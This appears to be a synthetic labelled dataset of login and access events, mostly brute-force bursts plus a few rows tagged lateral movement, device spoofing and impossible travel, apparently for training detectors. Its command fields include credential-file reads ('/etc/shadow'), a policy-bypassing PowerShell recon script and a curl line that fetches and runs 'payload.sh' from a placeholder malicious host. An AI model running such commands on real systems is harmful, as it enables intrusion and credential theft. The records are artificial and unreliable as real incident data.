entity_id,entity_type,timestamp,source_ip,geo_location,resource_accessed,auth_method,session_duration,command_sequence,device_fingerprint,login_success,label
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:39:47,171.93.46.181,"Riveratown, Saint Lucia",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:39:49,171.93.46.181,"Carolside, Cote d'Ivoire",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:39:50,171.93.46.181,"North Andrew, Belgium",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:39:50,171.93.46.181,"Jacquelinehaven, Kuwait",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:39:57,171.93.46.181,"South Bonnie, China",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:39:58,171.93.46.181,"Hughesborough, Saint Barthelemy",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:40:01,171.93.46.181,"Lake Jillstad, Brazil",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:40:03,171.93.46.181,"North Lisa, Switzerland",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:40:06,171.93.46.181,"North Steven, Cambodia",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:40:07,171.93.46.181,"Port Davidtown, Sierra Leone",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:40:07,171.93.46.181,"Lake Brandyton, Uganda",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:40:09,171.93.46.181,"New Danielleville, Rwanda",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:40:12,171.93.46.181,"Lake Teresastad, Iceland",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:40:13,171.93.46.181,"Jennifermouth, Slovakia (Slovak Republic)",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:40:13,171.93.46.181,"New Jessica, Finland",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:40:14,171.93.46.181,"Catherineside, France",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:40:16,171.93.46.181,"Pamelachester, Heard Island and McDonald Islands",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:40:17,171.93.46.181,"West Peterberg, Cambodia",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:40:17,171.93.46.181,"Antoniostad, Kyrgyz Republic",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:40:20,171.93.46.181,"Sheppardberg, Thailand",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:40:22,171.93.46.181,"Patelborough, Wallis and Futuna",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:40:23,171.93.46.181,"Griffinhaven, Yemen",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:40:25,171.93.46.181,"Jennymouth, American Samoa",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:40:29,171.93.46.181,"Mooreburgh, United Arab Emirates",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:40:35,171.93.46.181,"Theresafort, Seychelles",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:40:35,171.93.46.181,"South Diane, Kyrgyz Republic",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:40:41,171.93.46.181,"North Emily, Romania",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:40:43,171.93.46.181,"Lake John, Netherlands",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:40:47,171.93.46.181,"North Jennifer, Barbados",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:40:47,171.93.46.181,"New Amy, Oman",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:40:56,171.93.46.181,"Curtisland, Austria",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:41:02,171.93.46.181,"Scottborough, Bhutan",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:41:07,171.93.46.181,"Lake Christopher, Cote d'Ivoire",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:41:12,171.93.46.181,"Rodriguezton, Barbados",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:41:29,171.93.46.181,"Maddoxchester, Papua New Guinea",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:41:39,171.93.46.181,"Donaldshire, Gambia",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:41:44,171.93.46.181,"Harrellview, Russian Federation",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:41:55,171.93.46.181,"North Daniel, Armenia",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:42:02,171.93.46.181,"North John, Cayman Islands",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:42:15,171.93.46.181,"Troymouth, Tajikistan",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
5f13ca8f-9c0e-4d5f-b549-68487fffb4cd,User,2026-06-25 14:42:22,171.93.46.181,"New Nathan, Antigua and Barbuda",AWS Console,Password,0,N/A,Unknown Script/Bot,False,BruteForce
b08b2381-ce6d-4a30-8636-0414f07b774c,User,2026-06-25 15:03:35,175.99.68.144,"West Christopher, India",Domain Controller,MFA,6876,powershell.exe -ExecutionPolicy Bypass -File recon.ps1,macOS 13 - Chrome,True,Lateral Movement
b08b2381-ce6d-4a30-8636-0414f07b774c,User,2026-06-25 15:07:35,175.99.68.144,"West Christopher, India",Database,MFA,3518,powershell.exe -ExecutionPolicy Bypass -File recon.ps1,macOS 13 - Chrome,True,Lateral Movement
b08b2381-ce6d-4a30-8636-0414f07b774c,User,2026-06-25 15:15:35,175.99.68.144,"West Christopher, India",CRM,MFA,1735,ping -> ssh admin@10.0.0.5 -> sudo su,macOS 13 - Chrome,True,Lateral Movement
32bcf6d7-37e7-4bf2-a268-17b817fc0740,User,2026-06-25 15:19:50,101.9.141.224,"Cantrellfort, Benin",VPN,MFA,1489,N/A,iOS 17 - Brave - MAC: 64:7e:e1:0e:d0:ea,True,Device Spoofing
d73aada5-3c87-4bd7-88d8-d61c7fca43bb,User,2026-06-25 15:50:22,19.8.25.190,"Ralphton, Lebanon",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
d73aada5-3c87-4bd7-88d8-d61c7fca43bb,User,2026-06-25 15:50:24,19.8.25.190,"North Heidimouth, French Guiana",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
d73aada5-3c87-4bd7-88d8-d61c7fca43bb,User,2026-06-25 15:50:26,19.8.25.190,"Williamsbury, Burkina Faso",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
d73aada5-3c87-4bd7-88d8-d61c7fca43bb,User,2026-06-25 15:50:27,19.8.25.190,"Jamiechester, Ireland",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
d73aada5-3c87-4bd7-88d8-d61c7fca43bb,User,2026-06-25 15:50:28,19.8.25.190,"Port Josephburgh, Brazil",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
d73aada5-3c87-4bd7-88d8-d61c7fca43bb,User,2026-06-25 15:50:28,19.8.25.190,"Tiffanyview, Cook Islands",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
d73aada5-3c87-4bd7-88d8-d61c7fca43bb,User,2026-06-25 15:50:32,19.8.25.190,"Amandachester, Somalia",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
d73aada5-3c87-4bd7-88d8-d61c7fca43bb,User,2026-06-25 15:50:32,19.8.25.190,"Loweville, United States Minor Outlying Islands",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
d73aada5-3c87-4bd7-88d8-d61c7fca43bb,User,2026-06-25 15:50:35,19.8.25.190,"Evansland, Malaysia",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
d73aada5-3c87-4bd7-88d8-d61c7fca43bb,User,2026-06-25 15:50:37,19.8.25.190,"Christinemouth, Christmas Island",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
d73aada5-3c87-4bd7-88d8-d61c7fca43bb,User,2026-06-25 15:50:42,19.8.25.190,"Port Karenfurt, Azerbaijan",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
d73aada5-3c87-4bd7-88d8-d61c7fca43bb,User,2026-06-25 15:50:43,19.8.25.190,"South Madelineside, Faroe Islands",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
d73aada5-3c87-4bd7-88d8-d61c7fca43bb,User,2026-06-25 15:50:44,19.8.25.190,"Port Amanda, Cambodia",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
d73aada5-3c87-4bd7-88d8-d61c7fca43bb,User,2026-06-25 15:50:46,19.8.25.190,"North Joyceside, Kuwait",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
d73aada5-3c87-4bd7-88d8-d61c7fca43bb,User,2026-06-25 15:50:58,19.8.25.190,"Gregorystad, Pitcairn Islands",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
d73aada5-3c87-4bd7-88d8-d61c7fca43bb,User,2026-06-25 15:51:02,19.8.25.190,"Kellyberg, French Guiana",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
d73aada5-3c87-4bd7-88d8-d61c7fca43bb,User,2026-06-25 15:51:19,19.8.25.190,"Leonmouth, Ukraine",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
d73aada5-3c87-4bd7-88d8-d61c7fca43bb,User,2026-06-25 15:51:26,19.8.25.190,"West Charlesberg, Uzbekistan",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
d73aada5-3c87-4bd7-88d8-d61c7fca43bb,User,2026-06-25 15:51:30,19.8.25.190,"Andersonstad, Czech Republic",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
d73aada5-3c87-4bd7-88d8-d61c7fca43bb,User,2026-06-25 15:51:32,19.8.25.190,"North Cindyton, Croatia",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
d73aada5-3c87-4bd7-88d8-d61c7fca43bb,User,2026-06-25 15:51:34,19.8.25.190,"Kaylaview, Palau",Jira,Password,0,N/A,Unknown Script/Bot,False,BruteForce
d5e57111-b2f6-440d-aebb-ad098c9be517,User,2026-06-25 15:53:23,132.251.134.54,"South Matthew, Italy",VPN,Biometric,3040,N/A,Unknown Browser/Device,True,Impossible Travel
f87fbe58-7822-44ae-a158-0f88df21ecb0,User,2026-06-25 16:15:01,6.151.193.214,"South James, Aruba",AWS Console,SSO,1026,N/A,Parrot OS - Brave - MAC: 86:12:a5:e7:0d:3c,True,Device Spoofing
d4141f01-13b6-4e0a-9fd6-412206f7200d,User,2026-06-25 19:55:22,191.65.202.207,"New Michael, Aruba",VPN,Hardware Token,308,N/A,Unknown Browser/Device,True,Impossible Travel
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:29:51,151.73.17.27,"Dianaton, Czech Republic",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:29:52,151.73.17.27,"Leonville, Greenland",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:29:55,151.73.17.27,"South Patricia, Tuvalu",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:29:57,151.73.17.27,"Stevenberg, Estonia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:30:01,151.73.17.27,"Ryanberg, Hungary",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:30:01,151.73.17.27,"Francoland, Greece",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:30:03,151.73.17.27,"Lake Tinaport, Togo",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:30:05,151.73.17.27,"West Lisa, Togo",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:30:06,151.73.17.27,"West Jennifer, Armenia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:30:09,151.73.17.27,"Lake Craig, Pitcairn Islands",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:30:12,151.73.17.27,"South Rachel, Myanmar",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:30:15,151.73.17.27,"New Debraport, Denmark",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:30:15,151.73.17.27,"New Vanessaport, Mali",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:30:19,151.73.17.27,"Robertmouth, Tunisia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:30:35,151.73.17.27,"Garciaborough, Syrian Arab Republic",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:30:35,151.73.17.27,"Willisbury, Pakistan",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:30:41,151.73.17.27,"East Timothyfort, Taiwan",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:30:41,151.73.17.27,"North Ricky, Namibia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:30:56,151.73.17.27,"Franciscochester, Jamaica",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:31:09,151.73.17.27,"Samanthaport, Martinique",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:31:11,151.73.17.27,"Garnerside, American Samoa",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:31:11,151.73.17.27,"New Edward, Hong Kong",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:31:12,151.73.17.27,"Port Joshuafort, Tajikistan",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:31:16,151.73.17.27,"Hudsonside, Netherlands",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:31:21,151.73.17.27,"Morrisport, El Salvador",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:31:26,151.73.17.27,"South Erin, Bahrain",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:31:27,151.73.17.27,"Simpsonchester, Afghanistan",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:31:46,151.73.17.27,"Vanessaburgh, Tokelau",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
66f1e054-3c37-45fe-a0f0-3c7a801179cd,User,2026-06-26 07:32:11,151.73.17.27,"Reynoldsborough, Bouvet Island (Bouvetoya)",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
9738249a-07d9-42e1-be14-b177369c827a,User,2026-06-26 07:46:05,81.114.155.128,"North Matthewfort, Ecuador",Jira,Biometric,496,cat /etc/passwd -> cat /etc/shadow -> su root,Windows 10 - Safari,True,Lateral Movement
f1e766cd-2107-4d59-82b5-02cce01cc20b,User,2026-06-26 07:47:56,169.202.51.33,"Jameston, British Virgin Islands",GitLab,SSO,2211,N/A,Unknown Browser/Device,True,Impossible Travel
9738249a-07d9-42e1-be14-b177369c827a,User,2026-06-26 07:49:05,81.114.155.128,"North Matthewfort, Ecuador",Backup Server,Biometric,6007,curl http://malicious.ip/payload.sh -> chmod +x payload.sh -> ./payload.sh,Windows 10 - Safari,True,Lateral Movement
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:33:44,187.58.158.86,"Michaelchester, South Africa",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:33:46,187.58.158.86,"North Jennifer, Fiji",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:33:47,187.58.158.86,"South Crystalchester, El Salvador",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:33:49,187.58.158.86,"Smithshire, Puerto Rico",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:33:49,187.58.158.86,"Robertton, Bosnia and Herzegovina",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:33:50,187.58.158.86,"Lake Tanyaside, Equatorial Guinea",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:33:53,187.58.158.86,"North Jacquelineport, Niger",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:33:56,187.58.158.86,"Taylorborough, Canada",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:33:58,187.58.158.86,"East Lindahaven, Micronesia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:33:59,187.58.158.86,"South Mackenzie, New Caledonia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:34:00,187.58.158.86,"Sheppardstad, Sudan",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:34:00,187.58.158.86,"Jamesville, Sri Lanka",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:34:10,187.58.158.86,"East Michael, Christmas Island",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:34:17,187.58.158.86,"East Kimberlyside, Brazil",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:34:17,187.58.158.86,"Robertsshire, Saudi Arabia",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:34:18,187.58.158.86,"Cindytown, Saint Martin",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:34:18,187.58.158.86,"South Hayleymouth, Liechtenstein",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:34:22,187.58.158.86,"Nathanland, Turks and Caicos Islands",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:34:23,187.58.158.86,"Joneston, Cote d'Ivoire",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:34:24,187.58.158.86,"Rogerview, Central African Republic",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:34:26,187.58.158.86,"East Michael, Algeria",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:34:30,187.58.158.86,"South Kim, Togo",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:34:32,187.58.158.86,"North Tony, Cameroon",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:34:32,187.58.158.86,"Baileyview, Singapore",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:34:44,187.58.158.86,"Elliottside, Saint Martin",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:34:44,187.58.158.86,"East Nicolestad, Argentina",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:34:46,187.58.158.86,"Jamesfort, Swaziland",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
c152ce80-e2b4-4a12-ba8b-a540e5efa24c,User,2026-06-26 08:34:51,18.242.110.199,"Lake Vickiton, Kenya",Intranet,Hardware Token,465,N/A,Unknown Browser/Device,True,Impossible Travel
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:34:54,187.58.158.86,"Sandrabury, Guinea",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:34:59,187.58.158.86,"Tyroneport, Saint Barthelemy",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:35:00,187.58.158.86,"East Jeff, Burkina Faso",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:35:02,187.58.158.86,"East Anthonyville, Sweden",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:35:05,187.58.158.86,"East Brendabury, Senegal",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:35:11,187.58.158.86,"New Shawnland, Saint Martin",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:35:14,187.58.158.86,"East Danielside, India",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:35:32,187.58.158.86,"Samanthafurt, Malta",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
4882175e-b7f1-4b6a-9c51-9b17401bf710,User,2026-06-26 08:35:34,187.58.158.86,"Jamesbury, Puerto Rico",HRIS,Password,0,N/A,Unknown Script/Bot,False,BruteForce
